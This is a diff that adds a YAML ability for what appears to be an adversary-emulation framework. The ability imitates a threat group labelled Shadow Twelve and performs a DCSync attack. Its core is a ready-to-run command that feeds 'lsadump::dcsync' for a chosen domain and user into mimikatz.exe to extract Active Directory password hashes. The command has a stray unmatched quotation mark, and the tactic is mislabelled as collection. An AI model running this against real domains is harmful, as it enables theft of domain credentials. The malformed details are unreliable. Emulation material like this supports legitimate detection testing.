@@ -1,0 +1,19 @@
+- id: 612b6cfa-4ebe-4e50-bb1f-9feff9f4aaaa
+  name: "[SHADOW-TWELVE] DCSync with Mimikatz"
+  description: "Shadow использует утилиту Mimikatz для реализации атаки DCSync, получения данных из Active Directory и извлечения хешей паролей"
+  tactic: collection
+  technique:
+    attack_id: T1003.006
+    name: "OS Credential Dumping: DCSync"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          (echo "lsadump::dcsync /domain:#{domain} /user:#{user}") | .\mimikatz.exe "
+        timeout: 120
+        payloads:
+          - mimikatz.exe
+  variables:
+    - key: domain
+    - key: user
+
